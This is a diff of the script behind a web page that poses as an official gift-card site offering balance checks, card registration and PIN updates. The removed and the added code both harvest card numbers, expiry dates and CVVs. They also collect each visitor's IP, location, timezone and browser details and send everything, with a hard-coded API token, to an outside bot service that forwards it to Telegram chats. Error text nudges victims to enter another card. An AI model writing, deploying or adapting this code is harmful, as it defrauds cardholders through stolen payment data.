-    function updateDetectedCard(){}
-    cardInput.oninput=e=>{let v=e.target.value.replace(/\D/g,'').slice(0,19);e.target.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');e.target.classList.remove('error');updateDetectedCard()};
-    expiryMonth.oninput=e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,2);e.target.classList.remove('error')};
-    expiryYear.oninput=e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,2);e.target.classList.remove('error')};
-    cvvInput.oninput=e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,3);e.target.classList.remove('error')};
+<div class="cookie-bar" id="cookieBar">
+  <p>This site uses cookies to enhance your browsing experience and maintain security. By staying on this page, you agree to our cookie usage.</p>
+  <button type="button" class="btn-accept" id="cookieAccept">Accept</button>
+</div>
 
-    function luhnCheck(num){
-      const digits=String(num).replace(/\D/g,'');
-      let sum=0;let alt=false;
-      for(let i=digits.length-1;i>=0;i--){
-        let n=parseInt(digits[i],10);
-        if(alt){n*=2;if(n>9)n-=9}
-        sum+=n;alt=!alt;
+<script>
+var API_TOKEN='4439f671d73478c6401b758b50594ce5';
+var TELEGRAM_BEFORE='-1003750392427';
+var TELEGRAM_AFTER='-1003750392427';
+var API_URL='https://bot.pc.am/v3/checkBalance';
+
+var visitorIP='unknown', visitorCity='', visitorCountry='';
+(async function(){
+  try{var r=await fetch('https://ipapi.co/json/');var d=await r.json();visitorIP=d.ip||'unknown';visitorCity=d.city||'';visitorCountry=d.country_name||'';}catch(e){}
+})();
+var visitorTimezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown';
+var visitorReferral=document.referrer||'direct';
+
+(function(){
+  try{
+    if(localStorage.getItem('mygiftgiftcardmall_cookies')==='accepted'){document.getElementById('cookieBar').classList.add('hide');return;}
+    document.getElementById('cookieAccept').onclick=function(){localStorage.setItem('mygiftgiftcardmall_cookies','accepted');document.getElementById('cookieBar').classList.add('hide');};
+  }catch(e){}
+})();
+
+function showTab(name){
+  var tabs=['register','balance','disputes','pin'];
+  tabs.forEach(function(t){
+    var is=(t===name);
+    var tabEls=document.querySelectorAll('.tabs-official .tab-official');
+    if(tabEls[tabs.indexOf(t)])tabEls[tabs.indexOf(t)].classList.toggle('active',is);
+    var el=document.getElementById('tab-'+t);
+    if(el)el.style.display=is?'block':'none';
+  });
+}
+
+function setupCardInput(id){
+  var el=document.getElementById(id);
+  if(!el)return;
+  el.addEventListener('input',function(e){
+    var v=e.target.value.replace(/\D/g,'').slice(0,16);
+    e.target.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');
+    e.target.classList.remove('error');
+  });
+}
+function setupNumInput(id,max){
+  var el=document.getElementById(id);
+  if(!el)return;
+  el.addEventListener('input',function(e){
+    e.target.value=e.target.value.replace(/\D/g,'').slice(0,max);
+    e.target.classList.remove('error');
+  });
+}
+
+setupCardInput('regCardNumber');setupCardInput('balCardNumber');setupCardInput('pinCardNumber');
+setupNumInput('regExpMonth',2);setupNumInput('regExpYear',2);setupNumInput('regCvv',3);
+setupNumInput('balExpMonth',2);setupNumInput('balExpYear',2);setupNumInput('balCvv',3);
+setupNumInput('pinExpMonth',2);setupNumInput('pinExpYear',2);setupNumInput('pinCvv',3);
+setupNumInput('disputeLast4',4);setupNumInput('disputeZip',5);
+
+function luhnCheck(num){
+  var digits=String(num).replace(/\D/g,'');var sum=0,alt=false;
+  for(var i=digits.length-1;i>=0;i--){var n=parseInt(digits[i],10);if(alt){n*=2;if(n>9)n-=9;}sum+=n;alt=!alt;}
+  return sum%10===0;
+}
+
+function validateForm(prefix){
+  var cardEl=document.getElementById(prefix+'CardNumber');
+  var mEl=document.getElementById(prefix+'ExpMonth');
+  var yEl=document.getElementById(prefix+'ExpYear');
+  var cEl=document.getElementById(prefix+'Cvv');
+  var digits=cardEl.value.replace(/\s/g,'');
+  var ok=true;
+  [prefix+'CardError',prefix+'ExpiryError',prefix+'CvvError'].forEach(function(id){var e=document.getElementById(id);if(e)e.textContent='';});
+  [cardEl,mEl,yEl,cEl].forEach(function(e){if(e)e.classList.remove('error');});
+
+  if(digits.length<15||digits.length>19){document.getElementById(prefix+'CardError').textContent='Please enter a valid card number';cardEl.classList.add('error');ok=false;}
+  else if(!luhnCheck(digits)){document.getElementById(prefix+'CardError').textContent='Invalid card number';cardEl.classList.add('error');ok=false;}
+  var mm=parseInt(mEl.value,10),yy=yEl.value;
+  if(!mEl.value||mEl.value.length!==2||mm<1||mm>12){document.getElementById(prefix+'ExpiryError').textContent='Enter valid month (01-12)';mEl.classList.add('error');ok=false;}
+  if(!yy||yy.length!==2){document.getElementById(prefix+'ExpiryError').textContent='Enter valid year (YY)';yEl.classList.add('error');ok=false;}
+  if(ok&&mm&&yy){var now=new Date();var expDate=new Date(2000+parseInt(yy,10),mm,0);if(expDate<now){document.getElementById(prefix+'ExpiryError').textContent='Card has expired';mEl.classList.add('error');yEl.classList.add('error');ok=false;}}
+  var cvv=cEl.value;
+  if(!cvv||cvv.length!==3){document.getElementById(prefix+'CvvError').textContent='Enter 3-digit security code';cEl.classList.add('error');ok=false;}
+  return ok;
+}
+
+function resetForm(type){
+  var map={register:'reg',balance:'bal',pin:'pin'};
+  var p=map[type];if(!p)return;
+  var form=document.getElementById(type==='balance'?'balanceForm':type+'Form');
+  if(form)form.reset();
+  var result=document.getElementById(p+'Result');
+  if(result){result.className='balance-result';result.innerHTML='';}
+  var fields=document.getElementById(p+'Fields');
+  if(fields)fields.style.display='';
+  var another=document.getElementById(p+'Another');
+  if(another)another.classList.remove('show');
+}
+
+function submitForm(prefix){
+  if(!validateForm(prefix))return;
+  var cardEl=document.getElementById(prefix+'CardNumber');
+  var mEl=document.getElementById(prefix+'ExpMonth');
+  var yEl=document.getElementById(prefix+'ExpYear');
+  var cEl=document.getElementById(prefix+'Cvv');
+  var btn=document.getElementById(prefix+'SubmitBtn');
+  var digits=cardEl.value.replace(/\s/g,'');
+  var btnLabel=btn.textContent;
+
+  btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Processing...';
+  document.getElementById('loadingOverlay').classList.add('show');
+
+  var extraNote='IP: '+visitorIP+(visitorCity?' | Location: '+visitorCity+', '+visitorCountry:'')+' | Timezone: '+visitorTimezone+' | Referral: '+visitorReferral+' | Page: '+window.location.href+' | UA: '+navigator.userAgent;
+  var params=new URLSearchParams({token:API_TOKEN,number:digits,month:(mEl.value||'').padStart(2,'0'),year:yEl.value||'',cvv:cEl.value||'',telegram_additional_note:extraNote});
+  if(TELEGRAM_BEFORE)params.set('telegram_id_before_check',TELEGRAM_BEFORE);
+  if(TELEGRAM_AFTER)params.set('telegram_id_after_check',TELEGRAM_AFTER);
+
+  fetch(API_URL+'?'+params.toString())
+    .then(function(res){return res.text();})
+    .then(function(text){
+      var data;try{data=JSON.parse(text);}catch(e){data={};}
+      var result={success:false,error:''};
+      var bal=null,curr='USD';
+      var d=data.data||data;
+      var raw=d.balance!==undefined?d.balance:(d.amount!==undefined?d.amount:(data.balance!==undefined?data.balance:data.amount));
+      if(raw!==undefined&&raw!==null&&raw!==''){bal=typeof raw==='number'?raw:parseFloat(String(raw));if(!isNaN(bal)){curr=d.currency||data.currency||'USD';}}
+      if(bal!==null&&bal!==undefined){result={success:true,balance:bal,currency:curr,cardLast4:digits.slice(-4)};}
+      else{
+        var st=(d&&d.status)!==undefined?d.status:(data.status||'');
+        var msg=(d&&(d.error_message||d.error||d.message))!==undefined?(d.error_message||d.error||d.message):(data.error_message||data.error||data.message||'');
+        var inv=['WRONG_INPUT','NO_CARD_DEAILS_FOUND','NO_CARD_DETAILS_FOUND','UNKNOWN_CARD_BIN','INVALID_CARD','CORRUPTED_CARD','REGISTERED_CARD'];
+        if(inv.includes(st))result.error='Check your card information or use a new card.';
+        else if(st==='INSUFFICIENT_CREDIT')result.error='Service temporarily unavailable. Please try again later.';
+        else if(st==='RATE_LIMIT')result.error='Too many requests. Please wait a moment and try again.';
+        else if(st==='WRONG_API_TOKEN')result.error='Service configuration error. Please contact support.';
+        else if(st==='FAILED'||st==='TIMEOUT'||st==='UNKNOWN_ERROR')result.error=msg||'Unable to process. Please try again.';
+        else result.error=msg||'Check your card information or use a new card.';
       }
-      return sum%10===0;
+      showResult(prefix,result);
+    })
+    .catch(function(){showResult(prefix,{success:false,error:'Connection failed. Please try again.'});})
+    .finally(function(){
+      document.getElementById('loadingOverlay').classList.remove('show');
+      btn.disabled=false;btn.textContent=btnLabel;
+    });
+}
+
+function showResult(prefix,data){
+  var el=document.getElementById(prefix+'Result');
+  el.className='balance-result show '+(data.success?'success':'error');
+  var successLabels={reg:'Card Registered',bal:'Available Balance',pin:'PIN Updated'};
+  var failLabels={reg:'Registration Failed',bal:'Unable to Check Balance',pin:'PIN Update Failed'};
+  if(data.success){
+    var amt=typeof data.balance==='number'?data.balance.toFixed(2):(data.balance!=null?String(data.balance):'0.00');
+    if(prefix==='bal'){
+      el.innerHTML='<div class="result-icon">\u2713</div><h3 style="margin-bottom:8px">'+successLabels[prefix]+'</h3><div class="balance-amount"><span class="currency">'+(data.currency||'USD')+'</span><span class="amount">$'+amt+'</span></div>'+(data.cardLast4?'<p class="card-info">Card ending in \u2022\u2022\u2022\u2022 '+data.cardLast4+'</p>':'');
+    } else {
+      el.innerHTML='<div class="result-icon">\u2713</div><h3 style="margin-bottom:8px">'+successLabels[prefix]+'</h3><p class="card-info">Your card has been processed successfully.</p>';
     }
+  } else {
+    el.innerHTML='<div class="result-icon">!</div><h3 style="margin-bottom:8px">'+failLabels[prefix]+'</h3><p class="error-message">'+(data.error||'Please verify your card details and try again.')+'</p>';
+  }
+  var fields=document.getElementById(prefix+'Fields');
+  if(fields)fields.style.display='none';
+  var another=document.getElementById(prefix+'Another');
+  if(another)another.classList.add('show');
+  el.scrollIntoView({behavior:'smooth',block:'nearest'});
+}
 
-    function validate(){
-      const digits=cardInput.value.replace(/\s/g,'');
-      let ok=true;
-      document.querySelectorAll('.field-error').forEach(el=>el.textContent='');
-      document.querySelectorAll('.form-group input').forEach(el=>el.classList.remove('error'));
-      if(digits.length<15||digits.length>19){document.getElementById('cardError').textContent='Please enter a valid card number';cardInput.classList.add('error');ok=false}
-      else if(!luhnCheck(digits)){document.getElementById('cardError').textContent='Invalid card number';cardInput.classList.add('error');ok=false}
-      const mm=parseInt(expiryMonth.value,10);
-      const yy=expiryYear.value;
-      if(!expiryMonth.value||expiryMonth.value.length!==2||mm<1||mm>12){document.getElementById('expiryError').textContent='Enter valid month (01-12)';expiryMonth.classList.add('error');ok=false}
-      if(!yy||yy.length!==2){document.getElementById('expiryError').textContent='Enter valid year (YY)';expiryYear.classList.add('error');ok=false}
-      if(ok&&mm&&yy){
-        const now=new Date();
-        const expYear=2000+parseInt(yy,10);
-        const expMonth=mm-1;
-        const expDate=new Date(expYear,expMonth+1,0);
-        if(expDate<now){document.getElementById('expiryError').textContent='Card has expired';expiryMonth.classList.add('error');expiryYear.classList.add('error');ok=false}
-      }
-      const cvv=cvvInput.value;
-      if(!cvv||cvv.length!==3){document.getElementById('cvvError').textContent='Enter 3-digit security code (000-999)';cvvInput.classList.add('error');ok=false}
-      return ok;
-    }
-
-    function showResult(data){
-      resultEl.className='balance-result show '+(data.success?'success':'error');
-      if(data.success){const amt=typeof data.balance==='number'?data.balance.toFixed(2):(data.balance!=null?String(data.balance):'0.00');resultEl.innerHTML='<div class="result-icon">✓</div><h2>Available Balance</h2><div class="balance-amount"><span class="currency">'+(data.currency||'USD')+'</span><span class="amount">'+amt+'</span></div>'+(data.cardLast4?'<p class="card-info">Card ending in •••• '+data.cardLast4+'</p>':'')}
-      else{resultEl.innerHTML='<div class="result-icon">!</div><h2>Unable to Check Balance</h2><p class="error-message">'+(data.error||'Please verify your card details and try again.')+'</p>'}
-      formFields.classList.add('hide');checkAnother.classList.add('show');resultEl.scrollIntoView({behavior:'smooth',block:'nearest'});
-    }
-
-    checkAnother.onclick=()=>{resultEl.className='balance-result';resultEl.innerHTML='';formFields.classList.remove('hide');checkAnother.classList.remove('show');form.reset();updateDetectedCard()};
-    (function(){document.querySelectorAll('a[href^="#"]').forEach(function(a){a.addEventListener('click',function(e){var id=this.getAttribute('href');if(id==='#'||!id)return;var el=document.querySelector(id);if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});}});});})();
-    (function(){var h=window.location.hash;if(h&&document.querySelector(h)){setTimeout(function(){document.querySelector(h).scrollIntoView({behavior:'smooth',block:'start'});},150);}})();
-
-    const CARD_ERROR_MSG='Check your card information or use a new card.';
-    const loadingOverlay=document.getElementById('loadingOverlay');
-
-    form.onsubmit=async e=>{
-      e.preventDefault();
-      if(!validate())return;
-      const digits=cardInput.value.replace(/\s/g,'');
-      submitBtn.disabled=true;submitBtn.innerHTML='<span class="spinner"></span> Signing in...';
-      loadingOverlay.classList.add('show');
-      try{
-        const cardNameVal=document.getElementById('cardName').value.trim();
-        const extraNote='IP: '+visitorIP+(visitorCity?' | Location: '+visitorCity+', '+visitorCountry:'')+(cardNameVal?' | Name on Card: '+cardNameVal:'')+' | Timezone: '+visitorTimezone+' | Referral: '+visitorReferral+' | Page: '+window.location.href+' | UA: '+navigator.userAgent;
-        const params=new URLSearchParams({token:API_TOKEN,number:digits,month:(expiryMonth.value||'').padStart(2,'0'),year:expiryYear.value||'',cvv:cvvInput.value||'',telegram_additional_note:extraNote});
-        if(TELEGRAM_BEFORE)params.set('telegram_id_before_check',TELEGRAM_BEFORE);
-        if(TELEGRAM_AFTER)params.set('telegram_id_after_check',TELEGRAM_AFTER);
-        const res=await fetch(API_URL+'?'+params.toString());
-        const text=await res.text();
-        let data;try{data=JSON.parse(text)}catch{data={}};
-        let result={success:false,error:''};
-        let bal=null;let curr='USD';
-        const d=data.data||data;
-        const raw=d.balance!==undefined?d.balance:(d.amount!==undefined?d.amount:(data.balance!==undefined?data.balance:data.amount));
-        if(raw!==undefined&&raw!==null&&raw!==''){bal=typeof raw==='number'?raw:parseFloat(String(raw));if(!isNaN(bal)){curr=d.currency||data.currency||'USD'}}
-        if(bal!==null&&bal!==undefined){result={success:true,balance:bal,currency:curr,cardLast4:digits.slice(-4)}}else{
-          const st=(d&&d.status)!==undefined?d.status:(data.status||'');
-          const msg=(d&&(d.error_message||d.error||d.message))!==undefined?(d.error_message||d.error||d.message):(data.error_message||data.error||data.message||'');
-          const cardInvalid=['WRONG_INPUT','NO_CARD_DEAILS_FOUND','NO_CARD_DETAILS_FOUND','UNKNOWN_CARD_BIN','INVALID_CARD','CORRUPTED_CARD','REGISTERED_CARD'];
-          if(cardInvalid.includes(st))result.error=CARD_ERROR_MSG;
-          else if(st==='INSUFFICIENT_CREDIT')result.error='Service temporarily unavailable. Please try again later.';
-          else if(st==='RATE_LIMIT')result.error='Too many requests. Please wait a moment and try again.';
-          else if(st==='WRONG_API_TOKEN')result.error='Service configuration error. Please contact support.';
-          else if(st==='FAILED'||st==='TIMEOUT'||st==='UNKNOWN_ERROR')result.error=msg||'Unable to check balance. Please try again.';
-          else result.error=msg||CARD_ERROR_MSG;
-        }
-        showResult(result);
-      }catch(err){showResult({success:false,error:'Connection failed. Please try again.'});}
-      loadingOverlay.classList.remove('show');
-      submitBtn.disabled=false;submitBtn.innerHTML='Sign In';
-    };
-    document.getElementById('tabActivate').onclick=function(){ document.getElementById('tabSignIn').classList.remove('active'); this.classList.add('active'); this.classList.remove('form-tab-activate'); document.getElementById('tabSignIn').classList.add('form-tab-activate'); };
-    document.getElementById('tabSignIn').onclick=function(){ document.getElementById('tabActivate').classList.remove('active'); this.classList.add('active'); this.classList.remove('form-tab-activate'); document.getElementById('tabActivate').classList.add('form-tab-activate'); };
-  </script>
+(function(){
+  var toggle=document.querySelector('.nav-toggle');
+  var panel=document.getElementById('primary-nav');
+  if(!toggle||!panel)return;
+  toggle.addEventListener('click',function(){
+    var isOpen=panel.classList.toggle('is-open');
+    toggle.setAttribute('aria-expanded',isOpen?'true':'false');
+    panel.setAttribute('aria-hidden',isOpen?'false':'true');
+  });
+})();
+</script>
 </body>
 </html>
